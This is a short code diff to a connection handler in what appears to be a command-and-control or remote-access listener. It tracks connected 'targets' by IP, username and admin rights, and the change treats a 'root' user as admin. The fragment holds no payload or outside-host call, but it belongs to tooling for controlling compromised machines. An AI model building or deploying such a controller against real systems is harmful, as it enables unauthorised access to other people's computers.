@@ -42,6 +42,8 @@ def communication_handler():
             admin = remote_target.recv(1024).decode()
             if admin == 1:
                 admin_value = 'Yes'
+            elif username == 'root':
+                admin_value = 'Yes'
             else:
                 admin_value = 'No'
             current_time = time.strftime("%H:%M:%S", time.localtime())
@@ -52,7 +54,7 @@ def communication_handler():
                 targets.append([remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_value])
                 print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
             else:
-                targets.append([remote_target, remote_ip[0], time_record, username, admin_value, op_sys])
+                targets.append([remote_target, remote_ip[0], time_record, username, admin_value])
                 print(f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command#> ', end="")
         except:
             pass
